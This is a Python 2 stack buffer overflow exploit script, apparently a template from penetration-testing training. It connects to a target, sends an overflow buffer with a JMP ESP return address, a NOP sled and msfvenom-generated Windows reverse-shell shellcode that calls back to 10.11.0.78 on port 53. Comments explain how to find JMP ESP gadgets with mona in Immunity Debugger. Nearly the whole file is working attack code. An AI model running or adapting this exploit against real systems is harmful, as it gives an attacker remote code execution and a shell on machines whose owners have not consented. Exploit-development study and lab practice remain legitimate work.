#!/usr/bin/env python2

import socket
import struct
from constants import *

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))




print "Run !mona jmp -r esp -cpb \"BAD_CHARS\" to find a JMP ESP instruction in Immunity"
print "Then generate appropriate shellcode. see comments"

# !mona jmp -r esp -cpb "\x00\x0A"
ptr_jmp_esp = 0x62501205

# if that doesn't work, then:
#Modules: !mona modules -- Look for no DEP, NX, ASLR && No Bad Char in address
         #go to the module "e then double click module"
          #!mona find -s esp -m MODULE.dll -cpb "\x00\x0a" "look for JMP ESP or PUSH ESP RETN"
         #if no DEP, you can try "./nasm_shell JMP ESP > FFE4"
          #!mona find -s "\xff\xe4" -m MODULE.dll -cpb "\x00\x0a"
         #Ensure JMP ESP by following address in disassembler "click on it then hit enter"
         #You can also try !mona suggest to see what would work

# msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A' -f python -v shellcode EXITFUNC=thread LHOST=10.11.0.78 LPORT=53
shellcode =  ""
shellcode += "\xfc\xbb\x4e\x2d\xbd\xba\xeb\x0c\x5e\x56\x31"
shellcode += "\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += "\xff\xff\xff\xb2\xc5\x3f\xba\x4a\x16\x20\x32"
shellcode += "\xaf\x27\x60\x20\xa4\x18\x50\x22\xe8\x94\x1b"
shellcode += "\x66\x18\x2e\x69\xaf\x2f\x87\xc4\x89\x1e\x18"
shellcode += "\x74\xe9\x01\x9a\x87\x3e\xe1\xa3\x47\x33\xe0"
shellcode += "\xe4\xba\xbe\xb0\xbd\xb1\x6d\x24\xc9\x8c\xad"
shellcode += "\xcf\x81\x01\xb6\x2c\x51\x23\x97\xe3\xe9\x7a"
shellcode += "\x37\x02\x3d\xf7\x7e\x1c\x22\x32\xc8\x97\x90"
shellcode += "\xc8\xcb\x71\xe9\x31\x67\xbc\xc5\xc3\x79\xf9"
shellcode += "\xe2\x3b\x0c\xf3\x10\xc1\x17\xc0\x6b\x1d\x9d"
shellcode += "\xd2\xcc\xd6\x05\x3e\xec\x3b\xd3\xb5\xe2\xf0"
shellcode += "\x97\x91\xe6\x07\x7b\xaa\x13\x83\x7a\x7c\x92"
shellcode += "\xd7\x58\x58\xfe\x8c\xc1\xf9\x5a\x62\xfd\x19"
shellcode += "\x05\xdb\x5b\x52\xa8\x08\xd6\x39\xa5\xfd\xdb"
shellcode += "\xc1\x35\x6a\x6b\xb2\x07\x35\xc7\x5c\x24\xbe"
shellcode += "\xc1\x9b\x4b\x95\xb6\x33\xb2\x16\xc7\x1a\x71"
shellcode += "\x42\x97\x34\x50\xeb\x7c\xc4\x5d\x3e\xd2\x94"
shellcode += "\xf1\x91\x93\x44\xb2\x41\x7c\x8e\x3d\xbd\x9c"
shellcode += "\xb1\x97\xd6\x37\x48\x70\x19\x6f\x53\x93\xf1"
shellcode += "\x72\x53\x82\x5d\xfa\xb5\xce\x4d\xaa\x6e\x67"
shellcode += "\xf7\xf7\xe4\x16\xf8\x2d\x81\x19\x72\xc2\x76"
shellcode += "\xd7\x73\xaf\x64\x80\x73\xfa\xd6\x07\x8b\xd0"
shellcode += "\x7e\xcb\x1e\xbf\x7e\x82\x02\x68\x29\xc3\xf5"
shellcode += "\x61\xbf\xf9\xac\xdb\xdd\x03\x28\x23\x65\xd8"
shellcode += "\x89\xaa\x64\xad\xb6\x88\x76\x6b\x36\x95\x22"
shellcode += "\x23\x61\x43\x9c\x85\xdb\x25\x76\x5c\xb7\xef"
shellcode += "\x1e\x19\xfb\x2f\x58\x26\xd6\xd9\x84\x97\x8f"
shellcode += "\x9f\xbb\x18\x58\x28\xc4\x44\xf8\xd7\x1f\xcd"
shellcode += "\x18\x3a\xb5\x38\xb1\xe3\x5c\x81\xdc\x13\x8b"
shellcode += "\xc6\xd8\x97\x39\xb7\x1e\x87\x48\xb2\x5b\x0f"
shellcode += "\xa1\xce\xf4\xfa\xc5\x7d\xf4\x2e\xc5\x81\x0a"
shellcode += "\xd1"








buf = ""
buf += "A"*(BUFFER_OFFSET - len(buf))
buf += struct.pack("<I", ptr_jmp_esp)

### Add padding OR add to Stack Pointer
buf += "\x90" * 16  # add a few just in case you don't directly hit ESP
### OR 
# SUB_ESP_10 = "\x83\xec\x10"
# buf += SUB_ESP_10


buf += shellcode
buf += "D"*(BUFFER_TOTLEN - len(buf))
buf += "\r\n"

send_payload(s, buf)
